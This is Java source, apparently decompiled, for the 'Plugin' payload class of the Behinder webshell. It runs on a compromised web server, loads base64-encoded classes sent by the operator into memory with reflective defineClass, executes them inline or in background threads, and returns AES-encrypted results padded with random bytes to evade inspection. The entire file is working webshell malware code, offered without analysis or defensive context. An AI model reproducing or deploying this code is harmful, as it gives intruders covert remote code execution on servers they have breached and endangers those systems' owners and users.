package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Plugin implements Runnable {
   public static String taskID;
   public static String action;
   public static String payload;
   private Object Request;
   private Object Response;
   private Object Session;
   private Object payloadObj;
   private Method payloadMethod;
   private Map taskResult;

   public Plugin() {
   }

   public Plugin(Object payloadObj, Method payloadMethod, Map taskResult) {
      this.payloadObj = payloadObj;
      this.payloadMethod = payloadMethod;
      this.taskResult = taskResult;
   }

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var24 = false;

      Object pluginBody;
      label183: {
         boolean var4;
         Method method;
         try {
            var24 = true;
            this.fillContext(obj);
            Map taskResult;
            ClassLoader classLoader;
            Class urlClass;
            byte[] payloadData;
            Class payloadCls;
            Object payloadObj;
            Method payloadMethod;
            if (action.equals("submit")) {
               if (payload.equals("")) {
                  pluginBody = this.sessionGetAttribute(this.Session, taskID + "_body");
                  if (pluginBody != null) {
                     payload = pluginBody.toString();
                     this.sessionSetAttribute(this.Session, taskID + "_body", (Object)null);
                  }
               }

               taskResult = (Map)this.sessionGetAttribute(this.Session, taskID);
               if (taskResult != null && taskResult.get("running").toString().equals("true")) {
                  throw new Exception("同一个插件只允许同时运行一个任务。");
               }

               taskResult = new HashMap();
               this.sessionSetAttribute(this.Session, taskID, taskResult);
               classLoader = this.getClass().getClassLoader();
               urlClass = ClassLoader.class;
               method = urlClass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
               method.setAccessible(true);
               payloadData = this.base64decode(payload);
               payloadCls = (Class)method.invoke(classLoader, payloadData, 0, payloadData.length);
               payloadObj = payloadCls.newInstance();
               payloadMethod = payloadCls.getDeclaredMethod("execute", Map.class);
               taskResult.put("running", "true");
               taskResult.put("result", "");
               payloadMethod.setAccessible(true);
               (new Thread(new Plugin(payloadObj, payloadMethod, taskResult))).start();
               result.put("msg", "任务提交成功");
               result.put("status", "success");
               var24 = false;
            } else if (action.equals("exec")) {
               taskResult = (Map)this.sessionGetAttribute(this.Session, taskID);
               if (taskResult != null && taskResult.get("running").toString().equals("true")) {
                  throw new Exception("同一个插件只允许同时运行一个任务。");
               }

               taskResult = new HashMap();
               this.sessionSetAttribute(this.Session, taskID, taskResult);
               classLoader = this.getClass().getClassLoader();
               urlClass = ClassLoader.class;
               method = urlClass.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
               method.setAccessible(true);
               payloadData = this.base64decode(payload);
               payloadCls = (Class)method.invoke(classLoader, payloadData, 0, payloadData.length);
               payloadObj = payloadCls.newInstance();
               payloadMethod = payloadCls.getDeclaredMethod("execute", Map.class);
               taskResult.put("running", "true");
               taskResult.put("result", "");
               payloadMethod.setAccessible(true);

               try {
                  payloadMethod.invoke(payloadObj, taskResult);
                  taskResult.put("running", "false");
                  result.put("msg", this.buildTaskResult(taskResult, true));
                  result.put("status", "success");
                  var24 = false;
               } catch (InvocationTargetException var29) {
                  taskResult.put("running", "false");
                  result.put("msg", var29.getTargetException().getMessage());
                  result.put("status", "fail");
                  var24 = false;
               } catch (Exception var30) {
                  taskResult.put("running", "false");
                  result.put("msg", var30.getMessage());
                  result.put("status", "fail");
                  var24 = false;
               }
            } else if (action.equals("getResult")) {
               taskResult = (Map)this.sessionGetAttribute(this.Session, taskID);
               result.put("msg", this.buildTaskResult(taskResult, true));
               result.put("status", "success");
               var24 = false;
            } else if (action.equals("stop")) {
               taskResult = (Map)this.sessionGetAttribute(this.Session, taskID);
               taskResult.put("running", "false");
               result.put("msg", "success");
               result.put("status", "success");
               var24 = false;
            } else if (action.equals("append")) {
               synchronized(this) {
                  pluginBody = this.sessionGetAttribute(this.Session, taskID + "_body");
                  if (pluginBody == null) {
                     this.sessionSetAttribute(this.Session, taskID + "_body", payload);
                  } else {
                     this.sessionSetAttribute(this.Session, taskID + "_body", pluginBody + payload);
                  }
               }

               result.put("status", "success");
               var24 = false;
            } else {
               var24 = false;
            }
            break label183;
         } catch (Throwable var31) {
            result.put("msg", var31.getMessage());
            result.put("status", "fail");
            var4 = true;
            var24 = false;
         } finally {
            if (var24) {
               try {
                  Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  Method write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var26) {
               }

            }
         }

         try {
            Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            method = so.getClass().getMethod("write", byte[].class);
            method.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var25) {
         }

         return var4;
      }

      try {
         pluginBody = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         Method write = pluginBody.getClass().getMethod("write", byte[].class);
         write.invoke(pluginBody, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         pluginBody.getClass().getMethod("flush").invoke(pluginBody);
         pluginBody.getClass().getMethod("close").invoke(pluginBody);
      } catch (Exception var27) {
      }

      return true;
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      bos.write(encrypted);
      bos.write(this.getMagic());
      return bos.toByteArray();
   }

   private String buildJson(Map entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = entity.get(key).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private String buildJsonArray(List list, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      sb.append("[");
      Iterator var4 = list.iterator();

      while(var4.hasNext()) {
         Map entity = (Map)var4.next();
         sb.append(this.buildJson(entity, encode) + ",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("]");
      return sb.toString();
   }

   private String buildTaskResult(Map taskResult, boolean encode) throws Exception {
      Map result = new HashMap();
      new StringBuilder();
      Iterator var5 = taskResult.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         Object value = taskResult.get(key);
         if (value instanceof String) {
            result.put(key, value.toString());
         } else if (value instanceof HashMap) {
            result.put(key, this.buildJson((Map)value, encode));
         } else if (value instanceof ArrayList) {
            result.put(key, this.buildJsonArray((List)value, encode));
         }
      }

      return this.buildJson(result, true);
   }

   private String base64encode(String clearText) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");
      Class Base64;
      Object Encoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, clearText.getBytes("UTF-8"));
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private byte[] base64decode(String base64Text) throws Exception {
      String version = System.getProperty("java.version");
      byte[] result;
      Class Base64;
      Object Decoder;
      if (version.compareTo("1.9") >= 0) {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Decoder = Base64.getMethod("getDecoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (byte[])Decoder.getClass().getMethod("decode", String.class).invoke(Decoder, base64Text);
      } else {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Decoder");
         Decoder = Base64.newInstance();
         result = (byte[])Decoder.getClass().getMethod("decodeBuffer", String.class).invoke(Decoder, base64Text);
      }

      return result;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }

   public void run() {
      try {
         this.payloadMethod.invoke(this.payloadObj, this.taskResult);
      } catch (Exception var2) {
         this.taskResult.put("running", "false");
         this.taskResult.put("error", "true");
         this.taskResult.put("result", "插件提交失败：" + var2.getMessage());
         var2.printStackTrace();
      }

   }
}
